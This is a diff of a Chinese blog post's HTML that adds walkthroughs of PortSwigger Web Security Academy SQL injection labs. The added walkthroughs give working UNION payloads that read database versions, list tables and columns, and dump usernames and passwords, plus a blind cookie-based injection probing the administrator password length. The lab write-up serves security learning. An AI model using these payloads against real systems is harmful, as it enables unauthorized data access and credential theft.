@@ -24,7 +24,7 @@
 <meta property="og:description" content="BurpSuite SQL注入实验室BurpSuite中SQL注入LAB。 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data这个实验是利用SQL注入查询隐藏的数据。 这个实验中的页面可以通过种类查看产品，发送请求类似： 1https:&#x2F;&#x2F;0a46001403d042a6c07ccd2">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-11-13T11:34:28.655Z">
-<meta property="article:modified_time" content="2022-11-13T12:54:20.253Z">
+<meta property="article:modified_time" content="2022-11-14T13:28:12.227Z">
 <meta property="article:author" content="YY">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="sql注入">
@@ -221,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.8k 字
+          5k 字
         
       </span>
     
@@ -232,7 +232,7 @@
         
         
         
-          24 分钟
+          42 分钟
         
       </span>
     
@@ -341,6 +341,53 @@
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a8500ea047b5589c03c93370073001d.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,banner FROM v$version-- -</span><br></code></pre></td></tr></table></figure>
 
 <p>解决。</p>
+<h2 id="Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</h2><p>查询MySQL和MS-SQL的版本。</p>
+<p>查询语句是这样的：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a2d00eb03086e4cc0084ee300750008.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Gifts<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,version()-- -</span><br></code></pre></td></tr></table></figure>
+
+<p>解决。</p>
+<h2 id="Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="Lab: SQL injection attack, listing the database contents on non-Oracle databases"></a>Lab: SQL injection attack, listing the database contents on non-Oracle databases</h2><p>列出数据库的内容（非Oracle数据库）。</p>
+<p>数据库中有一个表保存用户名和密码，首先要直到这个表的名称，然后查询其中数据，以<code>administrator</code>身份登录。</p>
+<p>首先查询表：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>acd00b803e2c090c0ce69f600a30044.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Pets<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,table_name from information_schema.tables-- -</span><br></code></pre></td></tr></table></figure>
+
+<p>显示的是所有的表，使用<code>database()</code>和<code>group_concat()</code>都是不行的。</p>
+<p>接着查询列：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>acd<span class="hljs-number">00</span>b<span class="hljs-number">803e2</span><span class="hljs-keyword">c</span><span class="hljs-number">090</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>ce<span class="hljs-number">69</span>f<span class="hljs-number">600</span>a<span class="hljs-number">30044</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span>column_name from information_schema.columns-- -<br></code></pre></td></tr></table></figure>
+
+<p>这里显示的是所有的列。</p>
+<p>最后得出表名是<code>users_zckisl</code>，列名<code>username_ikojlb</code>和<code>password_qrozsy</code>。</p>
+<p>查询用户信息：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>acd<span class="hljs-number">00</span>b<span class="hljs-number">803e2</span><span class="hljs-keyword">c</span><span class="hljs-number">090</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>ce<span class="hljs-number">69</span>f<span class="hljs-number">600</span>a<span class="hljs-number">30044</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> username_ikojlb<span class="hljs-punctuation">,</span>password_qrozsy from users_zckisl-- -<br></code></pre></td></tr></table></figure>
+
+<p>最后以<code>administrator</code>身份登录。</p>
+<p>解决。</p>
+<h2 id="Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="Lab: SQL injection attack, listing the database contents on Oracle"></a>Lab: SQL injection attack, listing the database contents on Oracle</h2><p>列出Oracle数据库的内容。</p>
+<p>首先Oracle数据库的查询有所不同：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a0500c703dc1e29c03c0290006900f4.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Pets<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27; from dual-- -</span><br></code></pre></td></tr></table></figure>
+
+<p>查询所有表：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>a<span class="hljs-number">0500</span><span class="hljs-keyword">c</span><span class="hljs-number">703</span>dc<span class="hljs-number">1e29</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0290006900</span>f<span class="hljs-number">4</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> &#x27;a&#x27;<span class="hljs-punctuation">,</span>table_name from all_tables-- -<br></code></pre></td></tr></table></figure>
+
+<p>查询列：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://<span class="hljs-number">0</span>a0500c703dc1e29c03c0290006900f4.web-security-academy.net/<span class="hljs-built_in">filter</span>?category=Pets<span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;,column_name from all_tab_columns where table_name=&#x27;</span>USERS_GHCEXS<span class="hljs-string">&#x27;-- -</span><br></code></pre></td></tr></table></figure>
+
+<p>得到表名：<code>USERS_GHCEXS</code>，列名：<code>USERNAME_ADIWDB</code>和<code>PASSWORD_FQQOQV</code>。</p>
+<p>查询信息：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//<span class="hljs-number">0</span>a<span class="hljs-number">0500</span><span class="hljs-keyword">c</span><span class="hljs-number">703</span>dc<span class="hljs-number">1e29</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0290006900</span>f<span class="hljs-number">4</span>.web-security-academy.net/<span class="hljs-keyword">filter</span>?category<span class="hljs-operator">=</span>Pets&#x27; union <span class="hljs-keyword">select</span> USERNAME_ADIWDB<span class="hljs-punctuation">,</span>PASSWORD_FQQOQV from USERS_GHCEXS-- -<br></code></pre></td></tr></table></figure>
+
+<p>以<code>administrator</code>身份登录。</p>
+<p>解决。</p>
+<h2 id="Lab-Blind-SQL-injection-with-conditional-responses"><a href="#Lab-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Lab: Blind SQL injection with conditional responses"></a>Lab: Blind SQL injection with conditional responses</h2><p>盲注。</p>
+<p>注入点在Cookie，首先抓包，然后：</p>
+<ul>
+<li><code>TrackingId=xxx&#39; and 1=1-- -</code>包含关键字<code>Welcome back</code></li>
+<li><code>TrackingId=xxx&#39; and 1=2-- -</code>不包含关键字<code>Welcome back</code></li>
+</ul>
+<p>已经知道了表名：<code>users</code>，列名：<code>username</code>和<code>password</code>，用户<code>administrator</code>，可以直接查询密码：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">TrackingId</span>=c8HItvOO5HAanUoK&#x27; <span class="hljs-keyword">AND</span> (select length(password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;administrator&#x27;</span>)&gt;5-- -<br></code></pre></td></tr></table></figure>
+
+<p>最后发现长度为19（太长了，不想注了）</p>
 
                 
               </div>
